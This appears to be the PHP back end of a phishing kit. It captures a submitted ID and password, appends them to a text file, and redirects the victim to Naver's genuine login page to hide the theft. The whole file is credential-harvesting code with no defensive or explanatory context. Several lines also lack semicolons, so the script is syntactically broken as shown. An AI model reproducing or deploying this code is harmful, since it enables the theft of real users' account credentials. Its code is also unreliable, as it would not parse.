<?php
$id=$_POST['id'];
$pw=$_POST['pw'];

$fp = fopen('user.txt','a')
fwrite($fp,$id)
fwrite($fp,"\n")
fwrite($fp,$pw)
fwrite($fp,"\n")

fclose($fp);

header('Location: https://nid.naver.com');
?>
~
